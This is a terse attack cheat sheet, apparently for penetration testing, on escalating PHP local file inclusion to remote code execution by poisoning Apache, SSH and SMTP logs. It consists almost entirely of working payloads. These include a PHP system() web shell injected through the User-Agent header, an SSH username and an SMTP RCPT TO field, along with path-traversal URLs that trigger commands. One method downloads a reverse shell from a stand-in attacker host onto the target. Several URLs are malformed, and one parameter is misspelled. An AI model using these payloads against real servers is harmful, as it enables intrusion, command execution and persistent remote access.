** LFI to RCE via Apache Log File Poisoning (PHP) **
Example URL: http//192.168.0.0/index.php?file=../../../../../../../var/log/apache2/access.log 
Method1
  Payload: curl "http://192.168.0.0/" -H "User-Agent: <?php system(\$_GET['cmd']); ?>" 
  Execute RCE: http//10.10.10.10/index.php?file=../../../../../../../var/log/apache2/access.log&cmd=id
Method2
  python -m SimpleHTTPServer 80 
  Payload: curl "http://192.168.0.0/" -H "User-Agent: <?php file_put_contents('shell.php',file_get_contents('http://ATTACKERIP:80/shell-php-rev.php')) ?>" 
  Execute RCE: http//10.10.10.10/shell.php

** LFI to RCE via SSH Log File Poisoning (PHP) **
Example URL: http//10.10.10.10/index.php?file=../../../../../../../var/log/auth.log 
Payload: ssh <?php system($_GET['cmd']);?>@<target_ip>
Execute RCE: http//10.10.10.10/index.php?file=../../../../../../../var/log/auth.log&cmd=id

** LFI to RCE via SMTP Log File Poisoning (PHP) **
Example URL: http//10.10.10.10/index.php?file=../../../../../../../var/log/mail.log 
telnet <target_ip> 25 // Replace with the target IP
MAIL FROM:<toor@gmail.com>
RCPT TO:<?php system($_GET['cmd']); ?>
Execute RCE: http//10.10.10.10/index.php?file=../../../../../../../var/log/mail.log&cmc=id







